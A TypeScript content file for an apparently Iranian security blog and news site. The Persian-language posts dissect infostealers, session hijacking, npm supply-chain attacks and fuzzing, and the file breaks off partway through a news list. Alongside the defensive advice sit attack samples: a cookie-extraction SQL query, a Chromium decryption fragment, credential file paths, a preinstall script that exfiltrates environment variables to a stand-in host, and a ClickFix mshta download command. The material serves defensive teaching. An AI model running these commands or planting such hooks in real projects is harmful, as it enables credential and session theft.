export interface BlogArticleSection {
  heading: string;
  paragraphs: string[];
  codeSnippet?: string;
  codeLanguage?: string;
  callout?: string;
}

export interface BlogPost {
  id: string;
  title: string;
  slug: string;
  summary: string;
  category: "استیلر و بدافزار" | "دفاع و هاردنینگ" | "هویت و سشن‌ها" | "تحقیقات زیرودی";
  readTime: string;
  date: string;
  author: string;
  authorRole: string;
  tags: string[];
  featured?: boolean;
  status?: "published" | "draft";
  content: {
    intro: string;
    sections: BlogArticleSection[];
    conclusion: string;
    actionableTakeaways: string[];
  };
}

export interface NewsArticle {
  id: string;
  slug: string;
  title: string;
  subtitle: string;
  category: "urgent" | "malware" | "zeroday" | "breach" | "defense";
  categoryLabel: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM";
  cveId?: string;
  cvssScore?: string;
  affectedTarget?: string;
  threatActor?: string;
  date: string;
  readTime: string;
  author: string;
  featured?: boolean;
  status?: "published" | "draft";
  summary: string;
  bodyParagraphs: string[];
  technicalAnalysis: {
    heading: string;
    paragraphs: string[];
    codeOrIoc?: string;
    codeLabel?: string;
  }[];
  mitigationSteps: string[];
  references?: string[];
}

export const DEFAULT_BLOG_POSTS: BlogPost[] = [
  {
    id: "post-1",
    title: "کالبدشکافی فنی بدافزارهای استیلر مدرن: RedLine، LummaC2 و استیلرهای Go چگونه سشن‌ها را می‌ربایند؟",
    slug: "modern-infostealers-anatomy-redline-lumma",
    summary:
      "بررسی مهندسی معکوس و گام‌به‌گام نحوه استخراج پسوردها، سشن کوکی‌های مرورگر، دور زدن App-Bound Encryption در کروم و سرقت توکن‌های تلگرام و کلیدهای SSH توسط نسل جدید بدافزارهای Infostealer.",
    category: "استیلر و بدافزار",
    readTime: "۱۱ دقیقه",
    date: "۸ مهر ۱۴۰۵",
    author: "تیم تحلیل تهدیدات رهام",
    authorRole: "Roham Threat Intelligence Labs",
    tags: ["Infostealer", "LummaC2", "RedLine", "DPAPI", "App-Bound Encryption", "Session Hijacking"],
    featured: true,
    status: "published",
    content: {
      intro:
        "در اکوسیستم تهدیدات سایبری امروز، بدافزارهای سرقت اطلاعات (Infostealers) به سلاح اول گروه‌های باج‌افزاری و مهاجمان دولتی برای نفوذ اولیه (Initial Access) تبدیل شده‌اند. برخلاف تروجان‌های دسترسی از راه دور (RAT) یا بیکن‌های Cobalt Strike که به دنبال ماندگاری در شبکه هستند، یک استیلر مدرن در کمتر از ۴۵ ثانیه تمام دارایی‌های هویتی سیستم قربانی را استخراج، فشرده‌سازی و به سرور فرماندهی (C2) ارسال کرده و سپس ردپای خود را پاک می‌کند.",
      sections: [
        {
          heading: "۱. معماری ذخیره‌سازی داده در مرورگرهای کرومیوم و تکنیک دور زدن قفل فایل",
          paragraphs: [
            "مرورگرهای مبتنی بر موتور Chromium (شامل Google Chrome، Microsoft Edge، Brave و Vivaldi) تمامی اطلاعات حساس کاربر را در پایگاه‌های داده SQLite در مسیر پروفایل کاربر (`%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default`) نگهداری می‌کنند. سه فایل کلیدی عبارتند از `Login Data` (نام کاربری و رمزهای عبور)، `Network\\Cookies` (کوکی‌های نشست فعال) و `Web Data` (اطلاعات فرم‌ها و کارت‌های بانکی).",
            "زمانی که مرورگر باز است، پروسه اصلی کروم یک قفل انحصاری (Exclusive File Lock) روی فایل SQLite کوکی‌ها قرار می‌دهد. استیلرهای نسل جدید برای دور زدن این محدودیت از سه تکنیک استفاده می‌کنند: کپی سطح پایین با Volume Shadow Copy، تزریق مستقیم شل‌کد به پروسه مرورگر، یا سوءاستفاده از قابلیت Debugging Port و Restart Manager ویندوز برای آزادسازی موقت هندل فایل.",
          ],
          codeLanguage: "sql",
          codeSnippet: `-- ساختار کوئری داخلی استیلر برای استخراج توکن‌های نشست حساس از جدول cookies
SELECT 
    host_key,
    name,
    path,
    encrypted_value,
    expires_utc,
    is_secure,
    is_httponly
FROM cookies
WHERE host_key LIKE '%.google.com'
   OR host_key LIKE '%.github.com'
   OR host_key LIKE '%.microsoftonline.com'
   OR host_key LIKE '%.aws.amazon.com';`,
          callout:
            "نکته کلیدی: توکن‌های احراز هویت ابری (مانند سشن‌های AWS، GitHub، Google Workspace و پنل‌های مدیریت سرور) پس از عبور از سد 2FA در قالب کوکی‌های HttpOnly ذخیره می‌شوند. سرقت این فایل به معنای دور زدن کامل احراز هویت دو مرحله‌ای است.",
        },
        {
          heading: "۲. کالبدشکافی رمزگشایی DPAPI و چالش App-Bound Encryption در کروم ۱۲۷+",
          paragraphs: [
            "در نسخه‌های پیشین کروم، کلید متقارن AES-256-GCM در فایل `Local State` با پیشوند `DPAPI` ذخیره می‌شد. هر پروسه‌ای که تحت سطح دسترسی کاربر فعلی (Current User Context) اجرا می‌شد می‌توانست با فراخوانی تابع ویندوزی `CryptUnprotectData` کلید اصلی را رمزگشایی کند.",
            "گوگل از نسخه ۱۲۷ کروم مکانیزم دفاعی App-Bound Encryption را معرفی کرد که کلید را با استفاده از یک سرویس سیستمی با سطح دسترسی `SYSTEM` به هویت اجرایی خودِ فایل باینری کروم گره می‌زند. با این حال، بررسی نمونه‌های اخیر LummaC2 و Stealc نشان می‌دهد مهاجمان با تکنیک‌های Process Hollowing در پروسه مجاز کروم و یا فراخوانی اینترفیس COM مربوط به `IElevator` از درون حافظه تزریق‌شده، همچنان قادر به استخراج کلید در محیط کاربری هستند.",
          ],
          codeLanguage: "c",
          codeSnippet: `// الگوی مفهومی رمزگشایی بلاک AES-GCM پس از استخراج Master Key
// ساختار encrypted_value در کرومیوم: [3 بایت امضای v10 یا v20] + [12 بایت Nonce/IV] + [Ciphertext] + [16 بایت Auth Tag]
BYTE* pNonce = encryptedBlob + 3;
BYTE* pCipherText = encryptedBlob + 15;
DWORD cbCipherText = blobSize - 3 - 12 - 16;
BYTE* pAuthTag = encryptedBlob + (blobSize - 16);

BCryptDecrypt(hKey, pCipherText, cbCipherText, &authInfo, pNonce, 12, plainText, cbPlain, &cbResult, 0);`,
        },
        {
          heading: "۳. شکار دارایی‌های فراتر از مرورگر: SSH، تگرام، دیسکورد و کیف‌پول‌ها",
          paragraphs: [
            "تمرکز استیلرهای مدرن صرفاً روی مرورگر نیست؛ آن‌ها برای شکار مدیران سرور و توسعه‌دهندگان طراحی شده‌اند. ماژول‌های File Grabber در این بدافزارها به صورت بازگشتی دایرکتوری‌های کلیدی را برای یافتن کلیدهای خصوصی SSH، فایل‌های پیکربندی Kubernetes (`~/.kube/config`)، فایل‌های `.env` و نشست‌های دسکتاپ تلگرام (`tdata`) اسکن می‌کنند.",
            "در مورد نرم‌افزارهای مبتنی بر Electron (مانند Discord و Slack)، استیلر مستقیماً پایگاه داده LevelDB آن‌ها را استخراج کرده و با الگوهای Regex توکن‌های Bearer و OAuth را بیرون می‌کشد.",
          ],
          codeLanguage: "bash",
          codeSnippet: `# مسیرهای حیاتی که در کمتر از ۵ ثانیه توسط استیلر جاروب می‌شوند:
%USERPROFILE%\\.ssh\\id_rsa
%USERPROFILE%\\.ssh\\id_ed25519
%USERPROFILE%\\.aws\\credentials
%APPDATA%\\Telegram Desktop\\tdata\\key_datas
%APPDATA%\\discord\\Local Storage\\leveldb\\*.ldb`,
        },
        {
          heading: "۴. معماری دفاع لایه‌ای و چرایی ناکارآمدی آنتی‌ویروس‌های سنتی",
          paragraphs: [
            "مهاجمان روزانه بیلدهای استیلر را با استفاده از Crypterهای چندلایه، امضاهای دیجیتال سرقت‌شده و تکنیک‌های جانبی (DLL Side-Loading) بسته‌بندی می‌کنند. به همین دلیل، تکیه صرف بر تشخیص مبتنی بر امضا (Signature Detection) در EDR/AV سنتی کافی نیست.",
            "رویکرد دفاعی مدرن نیازمند «حفاظت رفتاری از مخازن هویت» است: یعنی هرگونه تلاش پروسه‌های غیرمجاز (مانند `powershell.exe`, `python.exe`, `mshta.exe` یا باینری‌های ناشناخته در `AppData\\Temp`) برای باز کردن هندل خواندن روی فایل‌های `Cookies`، `Login Data` و `tdata` باید در سطح کرنل یا فیلتر درایور مسدود شود.",
          ],
        },
      ],
      conclusion:
        "درک دقیق مکانیزم عملکرد استیلرها نشان می‌دهد که مرز امنیتی امروز دیگر رمز عبور نیست، بلکه فایل‌های سشن و توکن‌های محلی روی دیسک هستند. پیاده‌سازی ایزولاسیون دسترسی به فایل‌های هویتی و استفاده از کلیدهای سخت‌افزاری FIDO2 تنها راهکار قطعی برای خنثی‌سازی زنجیره حمله استیلرهاست.",
      actionableTakeaways: [
        "حذف کامل عادت ذخیره رمزهای عبور حساس و سازمانی در Password Manager داخلی مرورگرها.",
        "محافظت از کلیدهای خصوصی SSH با عبارت رمز (Passphrase) قوی و نگهداری آن‌ها در SSH Agent امن یا کلید سخت‌افزاری.",
        "مسدودسازی اجرای اسکریپت‌های غیرمجاز (PowerShell / MSHTA / WScript) از طریق قوانین Attack Surface Reduction (ASR).",
        "استفاده از راهکارهای تخصصی قفل‌گذاری و مانیتورینگ فایل‌های سشن (مانند آنتی‌استیلر هوشمند رهام) روی سیستم‌های حساس.",
      ],
    },
  },
  {
    id: "post-2",
    title: "چرا تایید دو مرحله‌ای پیامکی و TOTP در برابر سرقت سشن بی‌اثر است؟ معماری Passkey و Device-Bound Sessions",
    slug: "why-sms-2fa-fails-against-session-theft-dbsc",
    summary:
      "تحلیل عمیق تفاوت فاز احراز هویت (Authentication) با فاز مدیریت نشست (Session Management) و بررسی استاندارد جدید DBSC (Device Bound Session Credentials) و FIDO2 برای مهار سرقت کوکی‌ها.",
    category: "هویت و سشن‌ها",
    readTime: "۹ دقیقه",
    date: "۴ مهر ۱۴۰۵",
    author: "واحد پژوهش رمزنگاری و هویت رهام",
    authorRole: "Roham Identity & Cryptography Group",
    tags: ["FIDO2", "Passkeys", "DBSC", "WebAuthn", "Session Hijacking", "Zero Trust"],
    featured: false,
    status: "published",
    content: {
      intro:
        "یکی از رایج‌ترین سوءبرداشت‌ها در میان مدیران امنیت و کاربران حرفه‌ای این است که «چون روی حساب من Google Authenticator یا تایید دو مرحله‌ای فعال است، هکر حتی با داشتن پسورد من هم نمی‌تواند وارد شود». در حالی که بیش از ۷۵٪ حوادث نفوذ به حساب‌های سازمانی در دو سال گذشته روی حساب‌هایی رخ داده که 2FA فعال داشته‌اند. کلید معما در مکانیزم «کوکی‌های نشست پس از احراز هویت» نهفته است.",
      sections: [
        {
          heading: "۱. شکاف امنیتی میان لحظه ورود (Login) و تداوم نشست (Session Persistence)",
          paragraphs: [
            "پروتکل HTTP ذاتاً بدون حالت (Stateless) است. هنگامی که شما نام کاربری، رمز عبور و کد ۶ رقمی دو مرحله‌ای را وارد می‌کنید، سرور پس از تایید هویت، یک توکن نشست (Session ID یا JWT/Refresh Token) صادر کرده و از طریق هدر `Set-Cookie` در مرورگر شما ذخیره می‌کند.",
            "از این لحظه به بعد، در هر درخواست بعدی به سرور، دیگر رمز عبور یا کد 2FA بررسی نمی‌شود؛ بلکه صرفاً وجود همان کوکی در هدر `Cookie` درخواست HTTP ملاک تشخیص هویت شماست. اگر بدافزار استیلر یا حمله AiTM (Adversary-in-the-Middle) این رشته متنی را کپی کند و در مرورگر مهاجم قرار دهد، سرور مهاجم را دقیقاً همان کاربر لاگین‌شده می‌شناسد.",
          ],
          codeLanguage: "http",
          codeSnippet: `GET /admin/billing-settings HTTP/2
Host: console.enterprise-cloud.example
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Cookie: __Host-session_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...;

# سرور بدون درخواست مجدد رمز یا 2FA، بلافاصله دسترسی کامل برمی‌گرداند!`,
          callout:
            "قانون طلایی امنیت هویت: توکن سشن معادلِ نتیجه نهاییِ «پسورد + کد دو مرحله‌ای» است. حفاظت از محل نگهداری توکن سشن باید هم‌تراز با حفاظت از کلید خصوصی باشد.",
        },
        {
          heading: "۲. حملات فیشینگ معکوس (AiTM) با ابزارهای Evilginx",
          paragraphs: [
            "حتی بدون آلودگی سیستم به بدافزار استیلر، مهاجمان با راه‌اندازی یک پروکسی معکوس (Reverse Proxy) میان کاربر و سایت اصلی (مانند Microsoft 365 یا Gmail)، ترافیک ورود را به صورت بلادرنگ از خود عبور می‌دهند.",
            "وقتی کاربر کد OTP را وارد می‌کند، پروکسی مهاجم آن را به سرور اصلی تحویل داده و کوکی سشن برگشتی از سرور را در هوا شکار می‌کند. تنها روشی که در این مرحله حمله AiTM را به‌طور کامل متوقف می‌کند، استاندارد FIDO2 / WebAuthn است؛ زیرا امضای دیجیتال کلید سخت‌افزاری به دامنه اصلی (Origin) مقید شده و روی دامنه فیشینگ معتبر نخواهد بود.",
          ],
        },
        {
          heading: "۳. انقلاب استاندارد DBSC (Device Bound Session Credentials)",
          paragraphs: [
            "برای حل ریشه‌ای مشکل دزدیده شدن کوکی‌ها از روی دیسک توسط استیلرها، کنسرسیوم W3C و تیم امنیتی کروم استاندارد جدید Device Bound Session Credentials (DBSC) را طراحی کرده‌اند.",
            "در معماری DBSC، نشست کاربر به یک جفت‌کلید نامتقارن که درون تراشه امن سخت‌افزاری سیستم (TPM 2.0) ساخته شده گره می‌خورد. کوکی‌های نشست عمری بسیار کوتاه (مثلاً ۵ دقیقه) دارند و برای تمدید آن‌ها، مرورگر باید چالش ارسالی سرور را با کلید خصوصیِ داخل TPM امضا کند. از آنجا که کلید خصوصی داخل TPM غیرقابل استخراج (Non-exportable) است، حتی اگر استیلر تمام فایل‌های کروم را بدزدد، سشن سرقت‌شده روی کامپیوتر هکر ظرف چند دقیقه از کار می‌افتد.",
          ],
        },
      ],
      conclusion:
        "مهاجرت از رمزهای عبور سنتی و کدهای پیامکی به سمت Passkey (مبتنی بر FIDO2) در کنار پیاده‌سازی سیاست‌های Continuous Access Evaluation (ارزیابی مستمر تغییر IP و مشخصات دستگاه در طول نشست)، ستون فقرات امنیت هویت در سازمان‌های پیشرو است.",
      actionableTakeaways: [
        "غیرفعال‌سازی کامل احراز هویت پیامکی (SMS) برای تمامی حساب‌های مدیریتی و جایگزینی با FIDO2/Passkey.",
        "فعال‌سازی بررسی تغییر ناگهانی کشور/ASN و اثرانگشت مرورگر در میان‌افزار بررسی سشن سرور.",
        "تنظیم پرچم‌های امنیتی `__Host-`، `HttpOnly`، `Secure` و `SameSite=Strict` روی تمامی کوکی‌های حساس.",
      ],
    },
  },
  {
    id: "post-3",
    title: "راهنمای جامع امن‌سازی ایستگاه کاری توسعه‌دهندگان در برابر حملات زنجیره تامین (npm / PyPI / Git)",
    slug: "developer-workstation-hardening-supply-chain",
    summary:
      "چگونه لپ‌تاپ برنامه‌نویسان به اصلی‌ترین دروازه ورود به زیرساخت ابری سازمان تبدیل می‌شود؟ بررسی تکنیک‌های پکیج‌های مسموم، اسکریپت‌های preinstall و معماری محیط توسعه ایزوله.",
    category: "دفاع و هاردنینگ",
    readTime: "۱۰ دقیقه",
    date: "۲۷ شهریور ۱۴۰۵",
    author: "تیم مهندسی DevSecOps رهام",
    authorRole: "Roham Enterprise Defense",
    tags: ["Supply Chain", "DevSecOps", "npm", "PyPI", "Container Isolation", "Hardening"],
    featured: false,
    status: "published",
    content: {
      intro:
        "ایستگاه کاری یک توسعه‌دهنده نرم‌افزار یا مهندس DevOps با کامپیوتر سایر کارمندان سازمان تفاوت بنیادین دارد: برنامه‌نویسان روزانه ده‌ها کتابخانه شخص ثالث از مخازن عمومی دانلود و اجرا می‌کنند و همزمان روی همان سیستم به کلیدهای پروداکشن، توکن‌های CI/CD و سرورهای اصلی دسترسی دارند. این ترکیب، سیستم توسعه‌دهنده را به جذاب‌ترین هدف برای مهاجمان زنجیره تامین تبدیل کرده است.",
      sections: [
        {
          heading: "۱. کالبدشکافی اجرای کد در پکیج‌های مخرب (Lifecycle Scripts)",
          paragraphs: [
            "مدیران بسته مانند `npm`، `yarn` و `pip` به پکیج‌ها اجازه می‌دهند در لحظه نصب، اسکریپت‌های دلخواه پوسته (`preinstall` و `postinstall` در `package.json` یا `setup.py` در پایتون) را با سطح دسترسی کامل کاربر اجرا کنند.",
            "مهاجمان با استفاده از تکنیک‌های Typosquatting (ثبت نام‌های مشابه پکیج‌های محبوب)، Dependency Confusion (ثبت نام پکیج‌های داخلی شرکت‌ها در ریپازیتوری عمومی با نسخه بالاتر) یا سرقت حساب نگهدارندگان پروژه‌های متن‌باز، کدهای استیلر را وارد چرخه بیلد می‌کنند.",
          ],
          codeLanguage: "json",
          codeSnippet: `{
  "name": "internal-auth-utils",
  "version": "9.9.9",
  "scripts": {
    "preinstall": "node -e \\"const os=require('os'),fs=require('fs'),https=require('https');const env=process.env;https.request({hostname:'telemetry-pkg.example',method:'POST'}).end(JSON.stringify({env,ssh:fs.existsSync(os.homedir()+'/.ssh/id_rsa')}))\\""
  }
}`,
          callout:
            "هشدار عملیاتی: اجرای یک دستور ساده `npm install` روی یک پروژه ناشناس، دقیقاً معادل دانلود و اجرای مستقیم یک فایل `.exe` ناشناس روی سیستم شماست.",
        },
        {
          heading: "۲. ایزولاسیون محیط توسعه با DevContainers و ماشین‌های مجازی سبک",
          paragraphs: [
            "بهترین اصل معماری امنیتی برای توسعه‌دهندگان، «عدم اعتماد به کد پروژه روی سیستم میزبان اصلی (Host OS)» است. استفاده از کانتینرهای توسعه (VS Code DevContainers) یا ماشین‌های مجازی ایزوله باعث می‌شود حتی در صورت وجود پکیج مخرب، کد بدافزار درون یک کانتینر محدود بدون دسترسی به مرورگر اصلی، فایل‌های شخصی و کلیدهای SSH سیستم میزبان محبوس بماند.",
          ],
          codeLanguage: "bash",
          codeSnippet: `# ۱. غیرفعال‌سازی سراسری اجرای خودکار اسکریپت‌های نصب در npm:
npm config set ignore-scripts true

# ۲. بررسی آسیب‌پذیری‌ها و تغییرات غیرمجاز قفل وابستگی‌ها در CI:
npm ci --ignore-scripts
npm audit --audit-level=high`,
        },
        {
          heading: "۳. مدیریت امن اسرار (Secrets) و حذف فایل‌های .env متنی",
          paragraphs: [
            "ذخیره کلیدهای پروداکشن و توکن‌های API به صورت متن آشکار در فایل‌های `.env` روی دیسک، ریسک نشت اطلاعات را به شدت افزایش می‌دهد. به جای نگهداری دائمی کلیدها در فایل، از ابزارهایی مانند `1Password CLI`، `HashiCorp Vault` یا `sops` استفاده کنید تا متغیرهای محیطی فقط در لحظه اجرا و در حافظه موقت (RAM) به پروسه تزریق شوند.",
          ],
        },
      ],
      conclusion:
        "امنیت زنجیره تامین نرم‌افزار از لپ‌تاپ برنامه‌نویس آغاز می‌شود. با غیرفعال کردن اسکریپت‌های خودکار نصب، جداسازی کانتینری محیط کدنویسی و حذف کلیدهای متنی از روی دیسک، می‌توان بیش از ۹۰ درصد حملات هدفمند علیه توسعه‌دهندگان را خنثی کرد.",
      actionableTakeaways: [
        "فعال‌سازی دائمی `ignore-scripts=true` در تنظیمات `.npmrc` سیستم‌های توسعه و سرورهای CI/CD.",
        "استفاده از DevContainer یا محیط لینوکسی مجزا بدون دسترسی به پوشه خانگی اصلی سیستم‌عامل.",
        "امضای دیجیتال تمامی کامیت‌های گیت (Git Commit Signing) با کلیدهای SSH یا GPG سخت‌افزاری.",
      ],
    },
  },
  {
    id: "post-4",
    title: "از کشف باگ تا اکسپلویت روز صفر: راهنمای عملی تحلیل آلودگی داده (Taint Analysis) و فازینگ هوشمند",
    slug: "zero-day-vulnerability-research-taint-analysis-fuzzing",
    summary:
      "چگونه پژوهشگران امنیت در کدهای پیچیده و باینری‌های بدون سورس، مسیر رسیدن ورودی کاربر به توابع خطرناک را ردیابی می‌کنند؟ مروری کاربردی بر متدولوژی کتاب «از روز صفر تا روز صفر».",
    category: "تحقیقات زیرودی",
    readTime: "۱۲ دقیقه",
    date: "۱۸ شهریور ۱۴۰۵",
    author: "واحد پژوهش آسیب‌پذیری رهام",
    authorRole: "Roham Vulnerability Research",
    tags: ["Zero-Day", "Taint Analysis", "AFL++", "Ghidra", "CodeQL", "Vulnerability Research"],
    featured: false,
    status: "published",
    content: {
      intro:
        "کشف یک آسیب‌پذیری روز صفر (Zero-Day) در نرم‌افزارهای دنیای واقعی نه حاصل شانس است و نه نتیجه‌ی خواندن تصادفی هزاران خط کد. پژوهشگران برجسته امنیت از یک متدولوژی سیستماتیک شامل «شناخت سطح حمله (Attack Surface)»، «تحلیل آلودگی داده از مبدأ تا مقصد (Source-to-Sink Taint Analysis)» و «فازینگ هدایت‌شده با پوشش کد (Coverage-Guided Fuzzing)» بهره می‌برند.",
      sections: [
        {
          heading: "۱. مدل‌سازی Source، Sink و Sanitizer در بازبینی کد",
          paragraphs: [
            "در تحلیل امنیتی کد، هر نقطه‌ای که داده‌های تحت کنترل مهاجم وارد برنامه می‌شوند (مانند پارامترهای HTTP، بسته‌های شبکه در `recv`، یا فایل‌های ورودی) یک «مبدأ آلوده (Taint Source)» نامیده می‌شود.",
            "در مقابل، توابعی که در صورت دریافت داده کنترل‌نشده باعث رخداد امنیتی می‌شوند (مانند `memcpy`، `strcpy`، `system`، `eval` یا اجرای کوئری SQL) «مقصد حساس (Sink)» هستند. هنر شکار آسیب‌پذیری، یافتن مسیری در گراف جریان کنترل برنامه است که داده را از Source به Sink برساند، بدون آنکه در میانه راه توسط یک «پاکساز (Sanitizer)» به درستی اعتبارسنجی شده باشد.",
          ],
          codeLanguage: "c",
          codeSnippet: `// نمونه کلاسیک آسیب‌پذیری Integer Overflow منتهی به Heap Buffer Overflow
void process_packet(uint8_t *network_buf, uint32_t count) {
    // Source: متغیر count مستقیماً از بسته شبکه خوانده شده است
    // اگر count برابر 0x40000001 باشد، حاصل ضرب در 4 دچار سرریز 32 بیتی شده و برابر 4 بایت می‌شود!
    uint32_t alloc_size = count * sizeof(uint32_t);
    uint8_t *heap_buf = (uint8_t *)malloc(alloc_size);
    
    // Sink: کپی کردن داده به اندازه count واقعی درون بافر کوچک 4 بایتی!
    memcpy(heap_buf, network_buf, count * sizeof(uint32_t));
}`,
          callout:
            "در فصل‌های ۲ و ۳ کتاب «از روز صفر تا روز صفر» در کتابخوان رهام، نحوه خودکارسازی کشف این الگوها با ابزارهای تحلیل ایستا مانند CodeQL و Semgrep به طور کامل با مثال‌های واقعی آموزش داده شده است.",
        },
        {
          heading: "۲. نوشتن مهار فازینگ (Fuzzing Harness) با کارایی بالا در AFL++",
          paragraphs: [
            "زمانی که با یک پارسر باینری پیچیده (مانند پردازشگر تصویر، PDF یا پروتکل شبکه) روبرو هستیم، فازینگ هدایت‌شده با پوشش کد (Coverage-Guided Fuzzing) بهترین ابزار است. به جای اجرای کل برنامه از ابتدا برای هر ورودی، پژوهشگر یک تابع کوچک به نام Harness می‌نویسد که مستقیماً تابع هدف را در حافظه و با قابلیت Persistent Mode در AFL++ هزاران بار در ثانیه فراخوانی می‌کند.",
          ],
          codeLanguage: "c",
          codeSnippet: `// نمونه Harness در حالت Persistent Mode برای AFL++ همراه با AddressSanitizer (ASan)
__AFL_FUZZ_INIT();

int main(void) {
    #ifdef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif
    unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;
    while (__AFL_LOOP(10000)) {
        int len = __AFL_FUZZ_TESTCASE_LEN;
        if (len < 8) continue;
        parse_custom_protocol_frame(buf, len);
    }
    return 0;
}`,
        },
      ],
      conclusion:
        "ترکیب تحلیل ایستا (با CodeQL و Ghidra) برای درک منطق برنامه و تحلیل پویا (با AFL++ و Qiling) برای کشف حالات حدی، فرمول طلایی پژوهش آسیب‌پذیری مدرن است. تمامی ۱۱ فصل این مسیر به صورت رایگان و دوزبانه در کتابخوان رهام در اختیار شماست.",
      actionableTakeaways: [
        "مطالعه عملی فصل‌های ۱ تا ۱۰ کتاب «از روز صفر تا روز صفر» در بخش کتابخوان سایت.",
        "کامپایل کردن پروژه‌های C/C++ با پرچم‌های `-fsanitize=address,undefined` در محیط تست برای آشکارسازی فوری خطاهای حافظه.",
        "نوشتن کوئری‌های سفارشی CodeQL/Semgrep برای الگوهای باگ اختصاصی در پایپ‌لاین توسعه سازمان.",
      ],
    },
  },
];

export const DEFAULT_NEWS_ARTICLES: NewsArticle[] = [
  {
    id: "news-01",
    slug: "critical-lummac2-clickfix-campaign-targeting-developers-admins",
    title: "گزارش ویژه: موج جدید حملات بدافزار استیلر LummaC2 با تکنیک مهندسی اجتماعی ClickFix علیه مدیران سیستم و توسعه‌دهندگان",
    subtitle:
      "مهاجمان با شبیه‌سازی صفحات کپچای Cloudflare و خطای گیت‌هاب، کاربران را فریب می‌دهند تا دستورات مبهم‌شده PowerShell و MSHTA را مستقیماً در حافظه اجرا کنند.",
    category: "urgent",
    categoryLabel: "هشدار فوری",
    severity: "CRITICAL",
    cveId: "T1204.004 / ClickFix",
    cvssScore: "9.8",
    affectedTarget: "Windows 10 / 11 Workstations, Chromium Browsers, SSH & Cloud Tokens",
    threatActor: "LummaC2 MaaS Affiliates",
    date: "۹ مهر ۱۴۰۵ · ۱۴:۳۰",
    readTime: "۶ دقیقه",
    author: "میز خبر و رصد تهدیدات رهام",
    featured: true,
    status: "published",
    summary:
      "پژوهشگران امنیتی از جهش کم‌سابقه کمپین‌های انتشار استیلر LummaC2 خبر داده‌اند که در آن به جای ارسال فایل ضمیمه، از تکنیک فریب کاربر برای کپی و اجرای دستور در پنجره Run ویندوز (`Win + R`) استفاده می‌شود.",
    bodyParagraphs: [
      "بر اساس داده‌های ثبت‌شده در رادار تهدیدات سایبری، در طول دو هفته گذشته بیش از ده هزار دامنه مخرب و صفحات فیشینگ جعلی شناسایی شده‌اند که با نمایش یک پنجره تأیید هویت جعلی (مشابه Cloudflare Turnstile یا خطای نمایش فونت در مرورگر)، از بازدیدکننده می‌خواهند برای رفع مشکل، کلیدهای ترکیبی Win + R را فشرده و متن کپی‌شده در کلیپ‌بورد را با Ctrl + V اجرا نمایند.",
      "در لحظه‌ای که کاربر روی دکمه «من ربات نیستم» در صفحه وب کلیک می‌کند، اسکریپت جاوااسکریپت صفحه با استفاده از API کلیپ‌بورد مرورگر (`navigator.clipboard.writeText`) بدون اطلاع کاربر یک دستور یک‌خطی مخرب شامل فراخوانی `mshta.exe` یا `powershell.exe -WindowStyle Hidden` را در حافظه کلیپ‌بورد قرار می‌دهد.",
      "از آنجا که این دستور مستقیماً توسط خودِ کاربر در دیالوگ Run ویندوز اجرا می‌شود، بسیاری از مکانیزم‌های امنیتی مبتنی بر Mark-of-the-Web (MotW) که فایل‌های دانلودی از اینترنت را بررسی می‌کنند دور زده شده و پیلود نهایی بدافزار LummaC2 مستقیماً درون حافظه (Fileless) بارگذاری و اجرا می‌گردد.",
    ],
    technicalAnalysis: [
      {
        heading: "زنجیره اجرای حمله (Execution Chain) و شاخص‌های آلودگی",
        paragraphs: [
          "پس از اجرای دستور اولیه در Run، ابزار سیستمی `mshta.exe` یک فایل اسکریپت از راه دور را دریافت کرده و از طریق اسکریپت پاورشل کدگذاری‌شده با Base64، لودر مرحله دوم را در حافظه پروسه مجاز سیستم تزریق می‌کند.",
          "نسخه جدید LummaC2 بلافاصله پس از اجرا، سرویس رمزگشایی مرورگرها، کیف‌پول‌های افزونه‌ای، توکن‌های تلگرام و فایل‌های پیکربندی اتصال ریموت را استخراج و در قالب بسته‌های رمزنگاری‌شده HTTP POST به سرورهای C2 ارسال می‌کند.",
        ],
        codeLabel: "الگوی دستور مخرب کپی‌شده در کلیپ‌بورد و کوئری شکار تهدید (Sigma / Defender)",
        codeOrIoc: `# ۱. الگوی دستور تزریق‌شده در کلیپ‌بورد توسط صفحات ClickFix:
mshta.exe https://verify-human-check[.]com/captcha/auth.hta

# ۲. کوئری شکار تهدید (KQL / EDR) برای شناسایی اجرای مشکوک از طریق کلیدهای RunMRU رجیستری:
DeviceProcessEvents
| where InitiatingProcessFileName =~ "explorer.exe"
| where FileName in~ ("mshta.exe", "powershell.exe", "pwsh.exe", "cmd.exe")
| where ProcessCommandLine has_any ("http://", "https://", "-enc", "FromBase64String", "iex", "Invoke-Expression")`,
      },
    ],
    mitigationSteps: [
      "غیرفعال‌سازی یا محدودسازی اجرای ابزار `mshta.exe` از طریق سیاست‌های AppLocker یا Windows Defender Application Control (WDAC).",
      "آموزش فوری پرسنل فنی و اداری مبنی بر اینکه هیچ کپچا یا وب‌سایتی هرگز نیاز به زدن کلیدهای `Win + R` و اجرای دستور در ویندوز ندارد.",
      "فعال‌سازی مانیتورینگ کلید رجیستری `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU` در سامانه SIEM/EDR سازمان.",
      "استقرار محافظ فایل‌های سشن و کوکی برای مسدودسازی دسترسی پروسه‌های اسکریپتی به دیتابیس مرورگرها.",
    ],
    references: [
      "Roham Threat Intel Advisory #RT-2026-089",
      "MITRE ATT&CK Technique T1204.004 (User Execution: Malicious Copy and Paste)",
    ],
  },
  {
    id: "news-02",
    slug: "zero-day-rce-enterprise-vpn-ssl-gateways-patch-alert",
    title: "کشف آسیب‌پذیری روز صفر بحرانی (Pre-Auth RCE) در گیت‌وی‌های VPN و فایروال‌های سازمانی؛ exploited در حیات وحش",
    subtitle:
      "نقص سرریز بافر پشته (Stack-based Buffer Overflow) در ماژول پردازش بسته‌های احراز هویت SSL-VPN به مهاجمان اجازه می‌دهد بدون نیاز به نام کاربری، کد دلخواه را با دسترسی root اجرا کنند.",
    category: "zeroday",
    categoryLabel: "آسیب‌پذیری روز صفر",
    severity: "CRITICAL",
    cveId: "CVE-2026-38412",
    cvssScore: "9.8",
    affectedTarget: "Enterprise SSL-VPN & Perimeter Remote Access Gateways",
    threatActor: "APT & Initial Access Brokers",
    date: "۷ مهر ۱۴۰۵ · ۰۹:۱۵",
    readTime: "۷ دقیقه",
